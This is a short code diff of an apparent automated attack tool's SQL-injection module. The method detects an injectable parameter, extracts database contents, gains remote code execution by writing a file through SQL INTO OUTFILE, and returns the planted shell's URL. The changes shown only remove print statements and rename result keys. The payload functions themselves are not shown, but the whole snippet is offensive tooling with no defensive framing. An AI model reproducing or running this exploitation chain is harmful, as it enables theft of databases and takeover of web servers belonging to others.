@@ -10,9 +10,11 @@ class SQLiModule:
         is_vuln, tech = self.scanner.detect_sqli(param)
         if not is_vuln:
             return None
-        print(f"[SQLi] Vulnerable: {tech}")
         db_name = self.exploit.sqli_extract_data(param, tech)
-        if db_name:
-            print(f"[SQLi] Database: {db_name}")
-        shell = self.exploit.rce_via_sqli_outfile(param)
-        return {"vulnerable": True, "technique": tech, "db": db_name, "shell_url": shell}
+        shell_url = self.exploit.rce_via_sqli_outfile(param)
+        return {
+            "vulnerable": True,
+            "technique": tech,
+            "database": db_name,
+            "shell_url": shell_url
+        }
